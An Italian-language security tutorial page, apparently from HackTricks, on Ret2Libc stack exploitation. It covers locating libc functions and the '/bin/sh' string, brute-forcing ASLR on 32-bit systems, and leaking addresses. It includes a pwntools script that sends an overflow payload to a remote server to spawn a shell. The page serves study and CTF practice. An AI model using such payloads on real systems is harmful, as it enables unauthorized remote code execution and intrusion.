# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Informazioni di base**

L'essenza di **Ret2Libc** è reindirizzare il flusso di esecuzione di un programma vulnerabile a una funzione all'interno di una libreria condivisa (ad es., **system**, **execve**, **strcpy**) invece di eseguire shellcode fornito dall'attaccante nello stack. L'attaccante crea un payload che modifica l'indirizzo di ritorno nello stack per puntare alla funzione della libreria desiderata, mentre organizza anche eventuali argomenti necessari per essere impostati correttamente secondo la convenzione di chiamata.

### **Passaggi di esempio (semplificati)**

- Ottenere l'indirizzo della funzione da chiamare (ad es. system) e il comando da chiamare (ad es. /bin/sh)
- Generare una catena ROP per passare il primo argomento che punta alla stringa del comando e il flusso di esecuzione alla funzione

## Trovare gli indirizzi

- Supponendo che la `libc` utilizzata sia quella della macchina corrente, puoi trovare dove verrà caricata in memoria con:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Se vuoi controllare se l'ASLR sta cambiando l'indirizzo di libc puoi fare:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Conoscendo la libc utilizzata è anche possibile trovare l'offset della funzione `system` con:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Conoscendo la libc utilizzata è anche possibile trovare l'offset alla stringa `/bin/sh` funzione con:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Utilizzando gdb-peda / GEF

Conoscendo la libc utilizzata, è anche possibile usare Peda o GEF per ottenere l'indirizzo della funzione **system**, della funzione **exit** e della stringa **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Utilizzo di /proc/\<PID>/maps

Se il processo sta creando **figli** ogni volta che parli con esso (server di rete), prova a **leggere** quel file (probabilmente avrai bisogno di essere root).

Qui puoi trovare **esattamente dove è caricata la libc** all'interno del processo e **dove verrà caricata** per ogni figlio del processo.

![](<../../../../images/image (95).png>)

In questo caso è caricata in **0xb75dc000** (Questo sarà l'indirizzo base della libc)

## Libc sconosciuta

Potrebbe essere possibile che **non conosci la libc che il binario sta caricando** (perché potrebbe trovarsi su un server a cui non hai accesso). In quel caso potresti abusare della vulnerabilità per **leakare alcuni indirizzi e scoprire quale libreria libc** viene utilizzata:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

E puoi trovare un template di pwntools per questo in:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## Bypassare ASLR in 32 bit

Questi attacchi di brute-forcing sono **utili solo per sistemi a 32 bit**.

- Se l'exploit è locale, puoi provare a forzare l'indirizzo base della libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Se attacchi un server remoto, potresti provare a **forzare l'indirizzo della funzione `libc` `usleep`**, passando come argomento 10 (ad esempio). Se a un certo punto il **server impiega 10 secondi in più per rispondere**, hai trovato l'indirizzo di questa funzione.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## Esempio di codice x86 Ret2lib

In questo esempio il brute-force ASLR è integrato nel codice e il binario vulnerabile si trova su un server remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Esempio di Codice

Controlla l'esempio da:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (o puts)

Questo consente di **leakare informazioni dal processo** chiamando `printf`/`puts` con alcuni dati specifici posti come argomento.

## Ret2printf

Questo significa fondamentalmente abusare di un **Ret2lib per trasformarlo in una vulnerabilità di formato stringhe `printf`** utilizzando il `ret2lib` per chiamare printf con i valori da sfruttare (sembra inutile ma è possibile):

{{#ref}}
../../format-strings/
{{#endref}}

## Altri Esempi & riferimenti

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, dato un leak all'indirizzo di una funzione in libc, utilizzando un gadget
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR abilitato ma senza PIE, il primo passo è riempire un overflow fino al byte 0x00 del canary per poi chiamare puts e leakarlo. Con il canary viene creato un gadget ROP per chiamare puts per leakare l'indirizzo di puts dal GOT e poi un gadget ROP per chiamare `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bit, ASLR abilitato, senza canary, overflow dello stack in main da una funzione figlia. Gadget ROP per chiamare puts per leakare l'indirizzo di puts dal GOT e poi chiamare un gadget.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bit, senza pie, senza canary, senza relro, nx. Usa la funzione write per leakare l'indirizzo di write (libc) e chiama un gadget.

{{#include ../../../../banners/hacktricks-training.md}}
